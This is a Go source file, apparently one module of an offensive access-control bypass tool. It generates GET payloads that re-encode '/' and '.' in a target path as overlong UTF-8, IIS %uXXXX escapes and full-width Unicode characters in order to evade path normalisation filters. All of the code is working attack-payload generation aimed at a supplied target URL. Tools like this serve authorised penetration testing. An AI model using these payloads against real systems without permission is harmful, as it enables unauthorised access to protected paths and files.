package bypass

import (
	"fmt"
	"strings"
)

// UnicodeTechnique uses overlong UTF-8 encodings, IIS %uXXXX escapes, and
// full-width Unicode characters to bypass path normalisation filters.
type UnicodeTechnique struct{}

// Name returns the technique identifier.
func (t *UnicodeTechnique) Name() string { return "unicode" }

// Description returns a human-readable summary.
func (t *UnicodeTechnique) Description() string {
	return "Use overlong UTF-8, IIS Unicode escapes, and full-width chars to evade path matching"
}

// overlongTwoByte encodes a single ASCII byte c as a 2-byte overlong UTF-8
// sequence. This is technically invalid UTF-8 but is accepted by some parsers.
//
//	c = 0x2F ('/') → 0xC0, 0xAF
//	c = 0x2E ('.') → 0xC0, 0xAE
func overlongTwoByte(c byte) [2]byte {
	return [2]byte{
		0xC0 | (c >> 6),
		0x80 | (c & 0x3F),
	}
}

// overlongThreeByte encodes a single ASCII byte c as a 3-byte overlong UTF-8
// sequence.
//
//	c = 0x2F ('/') → 0xE0, 0x80, 0xAF
//	c = 0x2E ('.') → 0xE0, 0x80, 0xAE
func overlongThreeByte(c byte) [3]byte {
	// For ASCII (c < 0x80), the 3-byte overlong encoding is always:
	//   byte1 = 0xE0 (since c>>12 == 0 for any byte-sized ASCII value)
	//   byte2 = 0x80 | ((c>>6)&0x3F)
	//   byte3 = 0x80 | (c&0x3F)
	u := uint16(c)
	return [3]byte{
		0xE0 | byte(u>>12),
		0x80 | byte((u>>6)&0x3F),
		0x80 | byte(u&0x3F),
	}
}

// iisUnicodeEscape returns the IIS-style %uXXXX encoding for an ASCII byte.
//
//	c = 0x2F ('/') → "%u002F"
//	c = 0x2E ('.') → "%u002E"
func iisUnicodeEscape(c byte) string {
	return fmt.Sprintf("%%u%04X", c)
}

// fullWidthChar maps an ASCII byte to its full-width Unicode equivalent.
// Full-width characters occupy code points U+FF00 + (ASCII - 0x20).
//
//	'/' (0x2F) → U+FF0F (／)
//	'.' (0x2E) → U+FF0E (．)
func fullWidthChar(c byte) rune {
	if c < 0x21 || c > 0x7E {
		return rune(c)
	}
	return rune(0xFF00 + int(c) - 0x20)
}

// bytesToPercentHex encodes raw bytes as percent-encoded hex (%XX per byte).
func bytesToPercentHex(b []byte) string {
	var s strings.Builder
	s.Grow(len(b) * 3)
	for _, v := range b {
		fmt.Fprintf(&s, "%%%02X", v)
	}
	return s.String()
}

// unicodeReplacements describes the substitutions applied to '/' and '.'
type unicodeReplacement struct {
	label    string
	slashStr string
	dotStr   string
}

// buildReplacements precomputes the replacement strings for '/' and '.'.
func buildReplacements() []unicodeReplacement {
	// Overlong 2-byte
	ol2Slash := overlongTwoByte('/')
	ol2Dot := overlongTwoByte('.')

	// Overlong 3-byte
	ol3Slash := overlongThreeByte('/')
	ol3Dot := overlongThreeByte('.')

	return []unicodeReplacement{
		{
			label:    "overlong 2-byte",
			slashStr: bytesToPercentHex(ol2Slash[:]),
			dotStr:   bytesToPercentHex(ol2Dot[:]),
		},
		{
			label:    "overlong 3-byte",
			slashStr: bytesToPercentHex(ol3Slash[:]),
			dotStr:   bytesToPercentHex(ol3Dot[:]),
		},
		{
			label:    "IIS %uXXXX",
			slashStr: iisUnicodeEscape('/'),
			dotStr:   iisUnicodeEscape('.'),
		},
		{
			label:    "full-width Unicode",
			slashStr: runePercentEncode(fullWidthChar('/')),
			dotStr:   runePercentEncode(fullWidthChar('.')),
		},
	}
}

// applyUnicodeReplace replaces '/' and '.' in path with the given substitutions.
func applyUnicodeReplace(path, slashRepl, dotRepl string) string {
	var b strings.Builder
	b.Grow(len(path) * 4)
	for i := 0; i < len(path); i++ {
		switch path[i] {
		case '/':
			b.WriteString(slashRepl)
		case '.':
			b.WriteString(dotRepl)
		default:
			b.WriteByte(path[i])
		}
	}
	return b.String()
}

// Generate produces Unicode bypass payloads for the given target.
func (t *UnicodeTechnique) Generate(target *Target) []Payload {
	path := target.Path
	base := target.BaseURL()
	replacements := buildReplacements()

	// For each replacement style:
	//   1. Replace only '/' (slash-only)
	//   2. Replace only '.' (dot-only)
	//   3. Replace both '/' and '.'
	payloads := make([]Payload, 0, len(replacements)*3)

	for _, r := range replacements {
		// Slash-only replacement
		encoded := applyUnicodeReplace(path, r.slashStr, ".")
		payloads = append(payloads, makeRawPayload(
			t.Name(),
			fmt.Sprintf("unicode: %s (slash only)", r.label),
			"GET", base+encoded, nil,
		))

		// Dot-only replacement
		encoded = applyUnicodeReplace(path, "/", r.dotStr)
		payloads = append(payloads, makeRawPayload(
			t.Name(),
			fmt.Sprintf("unicode: %s (dot only)", r.label),
			"GET", base+encoded, nil,
		))

		// Both slash and dot
		encoded = applyUnicodeReplace(path, r.slashStr, r.dotStr)
		payloads = append(payloads, makeRawPayload(
			t.Name(),
			fmt.Sprintf("unicode: %s (slash + dot)", r.label),
			"GET", base+encoded, nil,
		))
	}

	return payloads
}
